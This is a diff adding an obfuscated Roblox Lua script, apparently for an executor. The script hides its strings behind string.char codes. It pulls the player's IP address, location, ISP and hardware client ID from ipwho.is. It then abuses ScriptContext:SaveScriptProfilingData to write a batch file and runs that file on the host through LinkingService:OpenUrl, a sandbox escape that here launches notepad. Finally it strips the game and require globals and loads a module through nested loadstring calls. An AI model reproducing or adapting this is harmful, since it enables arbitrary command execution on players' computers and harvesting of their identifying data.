@@ -1,0 +1,35 @@
+local res, lol = pcall(function()
+    local L, S = game:GetService("L".."i".."n".."k".."i".."n".."g".."S".."e".."r".."v".."i".."c".."e"), game:GetService("S".."c".."r".."i".."p".."t".."C".."o".."n".."t".."e".."x".."t")
+
+    local file = string.char(108, 111, 108) .. "." .. string.char(116, 120, 116)
+    local newline = string.char(10)
+    infor = game.HttpService:JSONDecode(getgenv().old.game:HttpGet(
+        string.char(104, 116, 116, 112, 115, 58, 47, 47, 105, 112, 119, 104, 111, 46, 105, 115)
+    ))
+
+    local textToSave = 
+        string.char(72, 101, 108, 108, 111, 44, 32) .. 
+        game:GetService(string.char(80, 108, 97, 121, 101, 114, 115)).LocalPlayer.Name .. newline ..
+        string.char(89, 111, 117, 114, 32, 72, 87, 73, 68, 32, 105, 115, 58, 32) .. 
+        game:GetService(string.char(82, 98, 120, 65, 110, 97, 108, 121, 116, 105, 99, 115, 83, 101, 114, 118, 105, 99, 101)):GetClientId() .. newline ..
+        string.char(89, 111, 117, 114, 32, 73, 80, 32, 105, 115, 58, 32) .. infor.ip .. newline ..
+        string.char(89, 111, 117, 32, 97, 114, 101, 32, 102, 114, 111, 109, 58, 32) .. infor.continent .. string.char(32, 45, 32) .. infor.country .. string.char(32, 45, 32) .. infor.region .. string.char(32, 45, 32) .. infor.city .. newline ..
+        string.char(89, 111, 117, 114, 32, 73, 110, 116, 101, 114, 110, 101, 116, 32, 80, 114, 111, 118, 105, 100, 101, 114, 32, 105, 115, 58, 32) .. infor.connection.isp .. newline ..
+        string.char(84, 104, 105, 115, 32, 115, 99, 114, 105, 112, 116, 32, 100, 111, 101, 115, 110, 39, 116, 32, 108, 111, 103, 32, 121, 111, 117, 114, 32, 100, 97, 116, 97)
+
+    local filereal = S:SaveScriptProfilingData(textToSave, file)
+    local command = string.char(83, 84, 65, 82, 84, 32, 67, 58, 92, 87, 73, 78, 68, 79, 87, 83, 92, 115, 121, 115, 116, 101, 109, 51, 50, 92, 110, 111, 116, 101, 112, 97, 100, 46, 101, 120, 101, 32)
+
+    L:OpenUrl(S:SaveScriptProfilingData(command .. filereal, string.char(97, 46, 98, 97, 116)))
+end)
+if res then return end
+getgenv().old = {}
+getgenv().old.game = game
+getgenv().require = nil
+getgenv().game = nil
+getfenv().require = nil
+loadstring([==[
+loadstring([=[
+require(getfenv(1).script)["x e n o"]()
+]=])()
+]==])()
